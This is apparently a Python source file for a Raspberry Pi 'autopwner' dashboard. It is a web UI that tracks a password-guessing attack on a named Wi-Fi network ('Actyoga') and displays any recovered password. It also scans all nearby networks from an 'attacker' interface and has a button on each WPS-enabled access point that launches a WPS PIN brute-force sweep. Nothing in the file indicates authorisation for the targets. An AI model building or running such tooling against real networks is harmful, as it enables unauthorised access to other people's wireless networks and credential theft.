#!/usr/bin/env python3
"""dashboard.py - live web UI for the Pi autopwner. Stdlib only.
Shows: target, progress tried/total, rate + ETA, wlan0/wlan1 health,
result/creds when found, LIVE wifi list (refreshable wlan1 scan),
click-to-start WPS tests, live log tail.

Usage (as root, so wpa_cli works): sudo nohup python3 dashboard.py --port 8080 --dir ./results-actyoga2 &
Then open http://<pi-ip>:8080/ from a laptop on the same LAN.
"""
import argparse, json, os, re, subprocess, time, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

ap = argparse.ArgumentParser()
ap.add_argument("--port", type=int, default=8080)
ap.add_argument("--dir", default="./results-actyoga2")
ARGS = ap.parse_args()
OUT = ARGS.dir
REPO = os.getcwd()

WLAN1_CTRL = "/run/wpa_supplicant_pwn"
WPS_SCRIPT = os.path.join(REPO, "wps_try_r4.sh")
SETUP_SCRIPT = os.path.join(REPO, "setup_wlan1.sh")
SCAN_CACHE = os.path.join(OUT, "live_scan.json")
scan_lock = threading.Lock()

def sh(cmd, timeout=8):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception:
        return ""

def parse_scan_results(out):
    nets = []
    for line in out.splitlines():
        if line.startswith("bssid") or not line.strip():
            continue
        parts = line.split("\t")
        if len(parts) < 5:
            continue
        try: sig = int(parts[2])
        except: sig = parts[2]
        nets.append({"bssid": parts[0], "freq": parts[1], "signal": sig,
                     "flags": parts[3], "ssid": parts[4]})
    return nets

def do_live_scan():
    """Trigger a fresh scan on wlan1 (attacker iface; wlan0 untouched). ~10s."""
    with scan_lock:
        sh(["wpa_cli", "-p", WLAN1_CTRL, "-i", "wlan1", "scan"], 10)
        time.sleep(8)
        out = sh(["wpa_cli", "-p", WLAN1_CTRL, "-i", "wlan1", "scan_results"], 15)
        data = {"at": time.time(), "at_iso": time.strftime("%H:%M:%S"),
                "nets": parse_scan_results(out)}
        try:
            with open(SCAN_CACHE, "w") as f:
                json.dump(data, f)
        except Exception:
            pass
        return data

def get_live_scan():
    try:
        with open(SCAN_CACHE) as f:
            return json.load(f)
    except Exception:
        return {"at": 0, "at_iso": "-", "nets": []}

def iface_status(iface, ctrl=None):
    cmd = ["wpa_cli", "-i", iface, "status"] if not ctrl else ["wpa_cli", "-p", ctrl, "-i", iface, "status"]
    d = {}
    for line in sh(cmd).splitlines():
        if "=" in line:
            k, v = line.split("=", 1)
            d[k.strip()] = v.strip()
    return {"ssid": d.get("ssid", "-"), "state": d.get("wpa_state", "?"),
            "ip": d.get("ip_address", "-"), "bssid": d.get("bssid", "-")}

def tail(path, n=15):
    try:
        with open(path, errors="ignore") as f:
            return f.read().splitlines()[-n:]
    except Exception:
        return []

def sec_short(flags):
    f = flags or ""
    if "SAE" in f and "PSK" not in f: return "WPA3"
    if "WPA2" in f: return "WPA2"
    if "WPA" in f: return "WPA"
    if "WEP" in f: return "WEP"
    return "OPEN"

def wps_sweeps():
    """Discover WPS sweep dirs (results-* with wps.log) and parse live progress."""
    base = os.path.dirname(os.path.abspath(OUT)) if not os.path.isdir(OUT) else os.path.abspath(OUT)
    base = os.path.dirname(base) if os.path.basename(base).startswith("results") else base
    sweeps = []
    try:
        names = sorted(os.listdir(base))
    except Exception:
        return sweeps
    for nm in names:
        if not nm.startswith("results-"):
            continue
        log = os.path.join(base, nm, "wps.log")
        if not os.path.isfile(log):
            continue
        try:
            tried = total = 0
            current = "-"
            with open(log, errors="ignore") as f:
                for ln in f:
                    m = re.search(r"(\d+) PINs", ln)
                    if m and not total:
                        total = int(m.group(1))
                    m2 = re.search(r"trying PIN (\S+)", ln)
                    if m2:
                        tried += 1
                        current = m2.group(1).rstrip(" .")
            tail3 = tail(log, 5)
            blob = "\n".join(tail3)
            if "WPS SUCCESS" in blob or os.path.isfile(os.path.join(base, nm, "creds.txt")):
                state = "SUCCESS"
            elif "[STOP]" in blob:
                state = "LOCKED-STOP"
            elif "[DONE]" in blob:
                state = "FINISHED"
            else:
                try:
                    age = time.time() - os.path.getmtime(log)
                except Exception:
                    age = 9999
                state = "RUNNING" if age < 120 else "STALLED"
            try:
                age = int(time.time() - os.path.getmtime(log))
            except Exception:
                age = None
            sweeps.append({"dir": nm, "tried": tried, "total": total, "current": current,
                           "state": state, "age_sec": age, "tail": tail3[-4:]})
        except Exception:
            pass
    return sorted(sweeps, key=lambda s: s["dir"], reverse=True)

def wps_currently_running():
    for sw in wps_sweeps():
        if sw["state"] == "RUNNING":
            return sw
    return None

def start_wps_test(bssid, ssid):
    """Launch a WPS PIN sweep against one AP. One at a time (single radio)."""
    if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid or ""):
        return {"error": "bad BSSID"}
    ssid = (ssid or "").strip()[:32]
    if not ssid:
        return {"error": "empty SSID"}
    busy = wps_currently_running()
    if busy:
        return {"error": f"sweep already running: {busy['dir']} ({busy['tried']}/{busy['total']})"}
    if not os.path.isfile(WPS_SCRIPT):
        return {"error": "wps_try_r4.sh missing on Pi"}
    # ensure attacker interface is up (idempotent, never touches wlan0)
    st = iface_status("wlan1", WLAN1_CTRL)
    if st["state"] == "?":
        out = sh(["bash", SETUP_SCRIPT], timeout=60)
        st = iface_status("wlan1", WLAN1_CTRL)
        if st["state"] == "?":
            return {"error": f"wlan1 supplicant unavailable: {out[-200:]}"}
    d = "results-wps-" + time.strftime("%m%d-%H%M%S")
    outdir = os.path.join(REPO, d)
    os.makedirs(outdir, exist_ok=True)
    logf = open(os.path.join(outdir, "launcher.log"), "a")
    try:
        p = subprocess.Popen(["bash", WPS_SCRIPT, bssid, ssid, outdir],
                             stdin=subprocess.DEVNULL, stdout=logf, stderr=subprocess.STDOUT,
                             start_new_session=True, cwd=REPO)
    except Exception as e:
        return {"error": str(e)}
    return {"started": d, "pid": p.pid, "bssid": bssid, "ssid": ssid}

def build_status():
    log = os.path.join(OUT, "console.log")
    lines = tail(log, 400)
    tried = total = 0
    current = "-"
    started = None
    first_try_t = None
    for ln in lines:
        m = re.search(r"\[(\d+)/(\d+)\] try '(.*)': ok=(\S+)", ln)
        if m:
            tried, total, current = int(m.group(1)), int(m.group(2)), m.group(3)
            if first_try_t is None:
                tm = re.match(r"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})", ln)
                if tm: first_try_t = tm.group(1)
        m2 = re.match(r"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}) \[\*] wlan0 healthy", ln)
        if m2 and started is None:
            started = m2.group(1)
    rate = eta = None
    if tried > 2:
        try:
            from datetime import datetime
            t0 = datetime.fromisoformat(first_try_t or started)
            el = (datetime.now() - t0).total_seconds()
            rate = tried / max(el, 1)
            if rate > 0 and total:
                eta = (total - tried) / rate
        except Exception:
            pass
    result, creds = {}, None
    for name in ("result.json", "creds.txt"):
        p = os.path.join(OUT, name)
        try:
            with open(p) as f:
                if name.endswith(".json"):
                    result.update(json.load(f))
                else:
                    creds = f.read().strip()
        except Exception:
            pass
    # live per-try status (written every attempt) overrides log parsing
    live_run = {}
    try:
        with open(os.path.join(OUT, "status.json")) as f:
            live_run = json.load(f)
    except Exception:
        pass
    if live_run:
        tried = live_run.get("tried", tried)
        total = live_run.get("total", total)
        current = live_run.get("current", current)
    status_age = int(time.time() - live_run["updated_epoch"]) if live_run.get("updated_epoch") else None
    svc = {}
    for unit in ("pi-pwn", "pi-dash"):
        out = sh(["systemctl", "is-active", unit], 5).strip().splitlines()
        svc[unit] = out[0] if out else "unknown"
    live = get_live_scan()
    nets = live.get("nets") or []
    if not nets:  # fallback to attack-time snapshot
        try:
            with open(os.path.join(OUT, "scan.json")) as f:
                nets = json.load(f).get("nets", [])
        except Exception:
            pass
    for n in nets:
        n["sec"] = sec_short(n.get("flags"))
        n["wps"] = "WPS" in (n.get("flags") or "")
    nets = sorted(nets, key=lambda n: n.get("signal", -99) if isinstance(n.get("signal"), int) else -99, reverse=True)
    phase = "hint" if tried <= 730 else "generic"
    pct = round(100.0 * tried / total, 1) if total else 0
    done_flag = bool(result.get("password")) or any("[DONE]" in ln for ln in lines[-3:])
    stale = status_age is not None and status_age > 90
    run_state = "FINISHED" if done_flag else ("RUNNING" if (status_age is not None and status_age < 300 and not stale) else "STALLED")
    return {
        "target": (result.get("target") if result else (live_run.get("target") if live_run else "Actyoga")),
        "tried": tried, "total": total, "current": current, "phase": phase,
        "pct": pct,
        "run_state": run_state,
        "status_age_sec": status_age,
        "budget_left_min": live_run.get("budget_left_min"),
        "svc": svc,
        "rate_per_min": round(rate * 60, 1) if rate else None,
        "eta_min": round(eta / 60, 1) if eta else None,
        "started": started,
        "wlan0": iface_status("wlan0"),
        "wlan1": iface_status("wlan1", WLAN1_CTRL),
        "found": result.get("password") if result else None,
        "creds": creds,
        "attack_done": bool(result and result.get("password") is not None) or any("time budget exhausted" in ln or "[DONE]" in ln for ln in lines[-3:]),
        "scan_live": bool(live.get("nets")),
        "scan_age_sec": int(time.time() - live["at"]) if live.get("at") else None,
        "scan_at": live.get("at_iso", "-"),
        "net_count": len(nets),
        "nets": nets[:30],
        "log_tail": tail(log, 12),
        "wps": wps_sweeps(),
    }

PAGE = """<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>Pi Pwn Dashboard</title><style>
body{font-family:system-ui,sans-serif;background:#0f1420;color:#e8ecf4;margin:0;padding:16px}
h1{font-size:20px;margin:0 0 12px}.card{background:#1a2233;border-radius:10px;padding:12px 16px;margin-bottom:12px}
.big{font-size:34px;font-weight:700}.ok{color:#4ade80}.bad{color:#f87171}.mut{color:#93a0b8}
table{width:100%;border-collapse:collapse;font-size:13px}td,th{padding:4px 6px;border-bottom:1px solid #2a3550;text-align:left}
pre{background:#0b0f18;border-radius:8px;padding:10px;overflow:auto;font-size:12px;max-height:260px}
#b{position:fixed;top:12px;right:14px;font-size:12px;color:#93a0b8}
button{background:#2563eb;color:#fff;border:0;border-radius:8px;padding:6px 12px;font-size:13px;cursor:pointer}
button:disabled{opacity:.5}.wpsy{color:#fbbf24;font-weight:700}
.bar{height:10px;background:#0b0f18;border-radius:6px;overflow:hidden;margin:8px 0}
.bar>div{height:100%;background:#2563eb}
.pill{display:inline-block;border-radius:20px;padding:2px 10px;font-size:12px;font-weight:700}
.run{background:#14532d;color:#4ade80}.stall{background:#7f1d1d;color:#f87171}.fin{background:#1e3a8a;color:#93c5fd}
</style></head><body><div id=b>auto-refresh 5s</div><h1>&#128737; Pi Autopwner &mdash; live</h1>
<div id=u>loading&hellip;</div>
<script>
async function r(){try{const s=await (await fetch('/api/status')).json();lastNets=s.nets||[];
document.getElementById('u').innerHTML=
`<div class=card><div class=mut>TARGET <b style="color:#fff">${s.target}</b> &middot; phase: ${s.phase} &middot; started ${s.started||'-'} &middot; budget left: ${s.budget_left_min??'-'} min</div>
<div><span class="pill ${s.run_state=='RUNNING'?'run':(s.run_state=='FINISHED'?'fin':'stall')}">${s.run_state}</span>
<span class=mut> status ${s.status_age_sec??'-'}s ago &middot; svc pi-pwn:${s.svc['pi-pwn']||'?'} pi-dash:${s.svc['pi-dash']||'?'}</span></div>
<div class=big>${s.tried} <span class=mut style="font-size:18px">/ ${s.total} (${s.pct}%)</span></div>
<div class=bar><div style="width:${s.pct}%"></div></div>
<div>trying now: <b>${s.current}</b> &middot; rate: ${s.rate_per_min||'-'}/min &middot; ETA: ${s.eta_min??'-'} min</div>
${s.found?`<div class=ok style="font-size:20px;font-weight:700;margin-top:8px">&#127881; PASSWORD: ${s.creds||s.found}</div>`:''}</div>
<div class=card><b>wlan0</b> (home/SSH): <span class="${s.wlan0.state=='COMPLETED'?'ok':'bad'}">${s.wlan0.state}</span> ${s.wlan0.ssid} ${s.wlan0.ip}
&emsp;<b>wlan1</b> (attacker): ${s.wlan1.state}</div>
<div class=card><b>WPS sweeps</b> <span class=mut>(PIN-only attacks — digits, live)</span>
${s.wps.length? s.wps.map(w=>`<div style="margin-top:8px"><b>${w.dir}</b>
<span class="pill ${w.state=='RUNNING'?'run':(w.state=='SUCCESS'?'run':(w.state=='FINISHED'?'fin':'stall'))}">${w.state}</span>
<span class=mut>${w.tried}/${w.total} &middot; now: <b>${w.current}</b> &middot; ${w.age_sec}s ago</span>
<pre style="max-height:90px">${w.tail.join('\\n')}</pre></div>`).join('') : '<div class=mut>No WPS sweeps yet</div>'}</div>
<div class=card><b>WiFi around (${s.net_count})</b> <span class=mut>${s.scan_live?'LIVE scan '+s.scan_at+' ('+s.scan_age_sec+'s ago)':'snapshot from attack start'}</span>
&ensp;<button id=rs onclick="rescan()">&#8635; Refresh live scan (~10s)</button><span id=rm class=mut></span>
<table><tr><th>SSID</th><th>BSSID</th><th>Sig</th><th>Sec</th><th>WPS</th><th>Action</th><th>Flags</th></tr>${s.nets.map((n,i)=>`<tr><td>${n.ssid||'<i>hidden</i>'}</td><td>${n.bssid}</td><td>${n.signal}</td><td>${n.sec}</td><td class="${n.wps?'wpsy':''}">${n.wps?'YES':''}</td><td>${n.wps&&n.ssid?`<button onclick="wpsStart(${i})">\u25b6 WPS test</button>`:''}</td><td class=mut>${n.flags}</td></tr>`).join('')}</table></div>
<div class=card><b>Live log</b><pre>${s.log_tail.join('\\n')}</pre></div>`;
}catch(e){document.getElementById('u').innerHTML='fetch error: '+e}}
async function rescan(){const b=document.getElementById('rs');b.disabled=true;document.getElementById('rm').textContent=' scanning…';
try{await fetch('/api/rescan');}catch(e){}b.disabled=false;r();}
let lastNets=[];
async function wpsStart(i){const n=lastNets[i];if(!n||!n.wps)return;
if(!confirm(`Start WPS PIN test vs "${n.ssid}" (${n.bssid})?\nOne sweep at a time; ~25 min for 63 PINs. AP may lock WPS after abuse.`))return;
const res=await (await fetch(`/api/wps-start?bssid=${encodeURIComponent(n.bssid)}&ssid=${encodeURIComponent(n.ssid)}`)).json();
alert(res.started?`WPS test started: ${res.started} (pid ${res.pid})`:`Not started: ${res.error}`);r();}
r();setInterval(r,5000)</script></body></html>"""

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _send(self, body, ctype):
        self.send_response(200); self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body))); self.end_headers()
        self.wfile.write(body)
    def do_GET(self):
        pu = urlparse(self.path)
        if pu.path == "/api/status":
            self._send(json.dumps(build_status()).encode(), "application/json")
        elif pu.path == "/api/rescan":
            self._send(json.dumps(do_live_scan()).encode(), "application/json")
        elif pu.path == "/api/wps-start":
            q = parse_qs(pu.query)
            res = start_wps_test(q.get("bssid", [""])[0], q.get("ssid", [""])[0])
            code = 200 if "started" in res else 409
            body = json.dumps(res).encode()
            self.send_response(code); self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body))); self.end_headers()
            self.wfile.write(body)
        else:
            self._send(PAGE.encode(), "text/html; charset=utf-8")

if __name__ == "__main__":
    print(f"dashboard on :{ARGS.port} reading {OUT}", flush=True)
    HTTPServer(("0.0.0.0", ARGS.port), H).serve_forever()
